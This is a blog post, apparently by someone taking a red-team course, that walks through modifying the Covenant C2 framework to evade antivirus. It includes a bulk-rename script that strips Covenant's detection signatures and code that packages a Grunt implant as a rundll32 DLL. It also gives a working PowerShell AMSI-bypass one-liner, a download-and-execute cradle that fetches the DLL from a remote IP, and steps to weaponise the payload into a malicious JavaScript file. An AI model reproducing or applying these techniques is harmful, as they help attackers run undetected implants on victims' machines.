---
title: "Entering the Covenant C2C " 
layout: "post"
---

In the last weeks i did the Red Team Operator course and made some new experiences with the open source C2-Framework Covenant which is used in the course materials. 
When i began the course, there was no content for AV-Evasion and C2-Customization, so i did that with Covenant for myself. 
In the meantime, content for AV-Evasion has been added in the course materials, a part of that material has been released by Rastamouse here.



### 1) Covenant use case - modified default dropper



First of all we will clone the main Covenant repository into our local machine. Furthermore we will modifiy some of the default word used by Covenat 
(Grunt, Jitter, Stage0, etc) in order to alter AV signature scanning capabilities. The bash script to automate this process is presented below:


```sh
sudo git clone --recurse-submodules https://github.com/ZeroPointSecurity/Covenant.git /home/kali/Desktop/red/Covenant

cd /home/kali/Desktop/red/Covenant/Covenant

mv ./Data/AssemblyReferences/ ../AssemblyReferences/
mv ./Data/ReferenceSourceLibraries/ ../ReferenceSourceLibraries/
mv ./Data/EmbeddedResources/ ../EmbeddedResources/
mv ./Models/Covenant/ ./Models/LazyMonkey/
mv ./Components/CovenantUsers/ ./Components/LazyMonkUsers/
mv ./Components/Grunts/ ./Components/Monks/
mv ./Models/Grunts/ ./Models/Monks/
mv ./Data/Grunt/GruntBridge/ ./Data/Grunt/MonkBridge/
mv ./Data/Grunt/GruntHTTP/ ./Data/Grunt/MonkHTTP/
mv ./Data/Grunt/GruntSMB/ ./Data/Grunt/MonkSMB/
mv ./Components/GruntTaskings/ ./Components/MonkTaskings/
mv ./Components/GruntTasks/ ./Components/MonkTasks/
mv ./Data/Grunt/ ./Data/Monk/

find ./ -type f -print0 | xargs -0 sed -i "s/Grunt/Monk/g"
find ./ -type f -print0 | xargs -0 sed -i "s/GRUNT/MONK/g"
find ./ -type f -print0 | xargs -0 sed -i "s/grunt/monk/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/covenant/lazymonk/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Covenant/LazyMonk/g"
find ./ -type f -print0 | xargs -0 sed -i "s/COVENANT/LAZYMONK/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ExecuteStager/ExcLev1/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/REPLACE_PROFILE/REP_PROF/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/REPLACE_PIPE/REP_PIP/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/GUID/ANGID/g"
find ./ -type f -print0 | xargs -0 sed -i "s/SetupAES/ConfAES/g"
find ./ -type f -print0 | xargs -0 sed -i "s/SessionKey/Sekey/g"
find ./ -type f -print0 | xargs -0 sed -i "s/EncryptedChallenge/EncChall/g"
find ./ -type f -print0 | xargs -0 sed -i "s/DecryptedChallenges/decryptchall/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Body/Body1/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Response/Response1/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage0Bytes/Bytes1/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Body/Body2/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Response/Response2/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage1Bytes/Bytes2/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Body/Body3/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Response/Response3/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Stage2Bytes/Bytes3/g"
find ./ -type f -print0 | xargs -0 sed -i "s/message64str/mesage64str/g"
find ./ -type f -print0 | xargs -0 sed -i "s/messageBytes/messAgEbytes/g"
find ./ -type f -print0 | xargs -0 sed -i "s/totalReadBytes/rebytes/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/inputStream/instr/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/outputStream/outstr/g"
find ./ -type f -print0 | xargs -0 sed -i "s/deflateStream/deflatestream/g"
find ./ -type f -print0 | xargs -0 sed -i "s/memoryStream/memorystream/g"
find ./ -type f -print0 | xargs -0 sed -i "s/compressedBytes/packdbyt/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/REPLACE_/REP_/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/_PROFILE_/_PROF_/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/_VALIDATE_/_VAL_/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.razor" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.json" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/GUID/USERID/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -name "*.razor" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -name "*.json" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -name "*.yaml" -print0 | xargs -0 sed -i "s/guid/userid/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ProfileHttp/prohttp/g"
find ./ -type f -print0 | xargs -0 sed -i "s/baseMessenger/bAsemEsSenger/g"

find ./ -type f -print0 | xargs -0 sed -i "s/PartiallyDecrypted/pdecry/g"
find ./ -type f -print0 | xargs -0 sed -i "s/FullyDecrypted/fuldecry/g"
find ./ -type f -print0 | xargs -0 sed -i "s/compressedBytes/packedbytes/g"

find ./ -type f -print0 | xargs -0 sed -i "s/CookieWebClient/MonksWebClient/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/CookieContainer/KekseContains/g"
#find ./ -type f -print0 | xargs -0 sed -i "s/GetWebRequest/webreq/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Jitter/JItter/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ConnectAttempts/tentativeconn/g"
find ./ -type f -print0 | xargs -0 sed -i "s/RegisterBody/RegBody/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/messenger/messaggio/g"
find ./ -type f -print0 | xargs -0 sed -i "s/Hello World/Its me, Mario/g"
find ./ -type f -print0 | xargs -0 sed -i "s/ValidateCert/valCer/g"
find ./ -type f -print0 | xargs -0 sed -i "s/UseCertPinning/certpin/g"
find ./ -type f -print0 | xargs -0 sed -i "s/EncryptedMessage/encmsg/g"
find ./ -type f -print0 | xargs -0 sed -i "s/cookieWebClient/monkwebclient/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/aes/cryva/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/aes2/cryva2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array5/ar5/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array6/ar6/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array4/ar4/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array7/ar7/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array1/ar1/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array2/ar2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/array3/ar3/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list1/l1/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list2/l2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list3/l3/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list4/l4/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/list5/l5/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group0/g0/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group1/g1/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group2/g2/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group3/g3/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group4/g4/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group5/g5/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group6/g6/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group7/g7/g"
find ./ -type f -name "*.cs" -print0 | xargs -0 sed -i "s/group8/g8/g"



find ./ -type f -name "*Grunt*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/Grunt/Monk/g")";
	mv "${FILE}" "${newfile}";
done
find ./ -type f -name "*GRUNT*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/GRUNT/MONK/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*grunt*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/grunt/monk/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*Covenant*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/Covenant/LazyMonk/g")";
	mv "${FILE}" "${newfile}";
done

find ./ -type f -name "*COVENANT*" | while read FILE ; do
	newfile="$(echo ${FILE} |sed -e "s/COVENANT/LAZYMONK/g")";
	mv "${FILE}" "${newfile}";
done

#find ./ -type f -name "*covenant*" | while read FILE ; do
#	newfile="$(echo ${FILE} |sed -e "s/covenant/monkcommand/g")";
#	mv "${FILE}" "${newfile}";
#done

mv ../AssemblyReferences/ ./Data/ 

mv ../ReferenceSourceLibraries/ ./Data/ 

mv ../EmbeddedResources/ ./Data/ 

dotnet build
dotnet run

```

__Note:__ Please modify the script accordingly with your needs 🚩

 
The new Covenant instance will generate the default Grunt using the __Monk__ word. Is up to the user to change the default Covenant Listener Profile. 
Once the modified C# Monkstager has been downloaded it is possible to add further obfuscation using a combination or both of the following tools: 

```cpp
Just another way to declare modified strings 
{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}";'
{""---G-U-I-----D"":""{0}"",""T----y-p-----e"":{1},""---M-e-t----a"":""{2}"",""---I---V---"":""{3}"",""---E--n---cry---pt-e-d-M-e---ss---a-g-e"":""{4}"",""---H-----M--A--C"":""{5}""}".Replace("-","");'
```

- [InvisibilityCloak:](https://github.com/xforcered/InvisibilityCloak) Obfuscation toolkit for C# post-exploitation tools that perform basics actions for a C# visual studio project.


- [NET-Obfuscate:](https://github.com/BinaryScary/NET-Obfuscate) Obfuscate ECMA CIL (.NET IL) assemblies to evade Windows Defender


### 2) Covenant Custom C2C Profile 

Whenever we download an offensive tool from the Internet, it comes as no surprise when it gets snapped up by an anti-virus solution. 
AV vendors are certainly keeping a keen eye on tools posted publicly (insert conspiracy theory about Microsoft owning GitHub) and are reacting relatively quickly to push signatures for those tools. 
However, it’s probably fair to say that these signatures are not particularly robust, and only really serve to catch those that don’t have the skills or knowledge to make the necesary modifications.

This holds true for __Covenant’s__ Windows __implant__ - Grunts.

Covenant does provide various means of changing the default Grunt behaviour, which can be leveraged in such a way as to remove the indicators that a particular security product is finding.
This post will look at Traffic Profiles and Grunt Templates.

Instead of making modifications willy-nilly, we need to know (with a reasonable degree of accuracy) which part(s) of the __Grunt__ __Stager__ get detected. 
For that I use __ThreatCheck__, which will split a sample into multiple chunks and submit them either to AMSI or Defender’s MpCmdRun utility.

From a default Covenant installation we can generate a standard binary Grunt then examine the file with ThreatCheck. Executing ThreatCheck will highlight the following malicious bytes:

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov1.JPG">
</p>

ThreatCheck dumps a `256-byte` hex view up from the end of the offending bytes, so the “interesting” bytes are always at the bottom. 
In any case, we see here the connect address for the listener, followed by the base64 encoded string VXNlci1BZ2VudA== with is User-Agent.

These request headers are part of the default traffic profile used by the default listener. 
However if we go into the profile editor, we’re free to add, remove, change these as we see fit. An example follow below:


<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov2.JPG">
</p>

- Inserted an additional header at the top so that the base64 encoded string for User-Agent was not appearing directly after the connect URL.

- Modified User-Agent String


Now when we regenerate the __Binary__ __Launcher__ and scan it with ThreatCheck, that particular detection is gone, but we get another one. 
ThreatCheck will only show one detection at a time, so this is certainly an iterative process. 
You obviously need to reiterate this process few times in order to find  all the malicious bytes the flag the Defender's signature.  




### 3) Grunt DLL with rundll32 - AvBypass

From Covenant we can create a Grunt DLL that has an export compatible with rundll32. 

- In Covenant, select the Binary Launcher and Generate a new __Grunt__. Then click the Code tab and copy the __StagerCode__.

- Open Visual Studio and create a new __Class__ __Library__ __(.NET __Framework)__ project. Delete everything in Class1.cs and paste the __StagerCode__.

- Go to Project > Manage NuGet Packages. Click Browse and search for __UnmanagedExports__. Install the package by Robert Giesecke.

- Collapse the __GruntStager__ class and add the following Export class underneath.

```cpp
public class Exports
{
    [DllExport("MonkEntry", CallingConvention = CallingConvention.Cdecl)]
    public static void MonkEntry(IntPtr hwnd,
    IntPtr hinst,
    string lpszCmdLine,
    int nCmdShow)
    {
        new MonkStager.MonkStager();
    }
}

```

- Add using statements for __System.Runtime.InteropServices__ and __RGiesecke.DllExport__. 

- Open the __Configuration__ __Manager__ and create a New Solution Platform for __x64__ (and x86 if you require).

Now build the project then copy the DLL to the target machine and execute with __rundll32__ as follow

```sh
rundll32 covenant-DLL-noAmsi.dll,MonkEntry
```

Now you should have your Grunt checking in on Covenant.

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov3.JPG">
</p> 



__Note:__ 🚩 The most basic (although not very interesting) method of loading and running this code, is from disk using PowerShell:


```powershell

# Patch Amsi
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)

PS > [System.Reflection.Assembly]::LoadFile("C:\Users\IEUser\Desktop\covenant-DLL-noAmsi.dll")
PS > [MonkStager.MonkStager]::Execute()

```
<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov4.JPG">
</p>

And note your new powershell Grunt checking in on Covenant.


<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov5.JPG">
</p>


We could also download the DLL from a remote location as follow below:

```powershell 
PS > $dll = (new-object net.webclient).DownloadData("http://192.168.152.100:1234/monk-Avbypass.dll)
PS > [System.Reflection.Assembly]::Load($dll)
PS > [MonkStager.MonkStager]::Execute()
```

### 4) Initial delivery 

We can try to simulate a campaign conducted by foreign APT adversaries. We will try to leverage the amazing [GadgetToJScript:](https://github.com/med0x2e/GadgetToJScript) project to weaponize our custom .NET assembly.


First of all we need to build GadgetToJScript in __VisualStudio__. Once the GadgetToJScript binary has been build we can launch the program to generate a malicious __.js__ file that will spawn our custom Covenant Grunt.

The code is illustrate below: 

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov6.JPG">
</p>

The parameters are as follow: 

- `a = .NET Assembly`
- `w = Script type js, vbs, vba or hta`
- `e = Encode type`
- `o = output file`
- `b = Bypass type check controls`
- `r = registration-free activation of .NET based COM`
                               

Once we have our malicious __.js__ file we can execute the file using the Windows build in script engine __cscript__ as follow:

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov7.JPG">
</p>

If everything went file you should now have your new cscript Grunt checking in on Covenant.

<p align="center">
  <img src="/assets/posts/2021-07-01-Entering-the-Covenant-C2C/cov8.JPG">
</p>
 